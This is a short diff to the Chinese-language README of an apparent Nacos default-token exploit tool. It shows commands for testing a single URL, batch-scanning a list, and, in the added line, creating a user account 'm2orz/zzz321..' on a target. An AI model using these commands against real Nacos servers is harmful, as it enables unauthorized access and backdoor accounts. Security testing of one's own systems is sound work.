@@ -6,6 +6,8 @@ Nacos 平台在默认配置下未对 token.secret.key 进行修改，攻击者�
 
 python3 Nacos_default.token.py -u http://127.0.0.1:1111 单个url测试
 
+python3 Nacos_default.token.py -a http://127.0.0.1:1111 添加用户m2orz/zzz321..
+
 python3 Nacos_default.token.py -f url.txt 批量检测
 
 扫描结束后会在当前目录生成存在漏洞url的vuln.txt
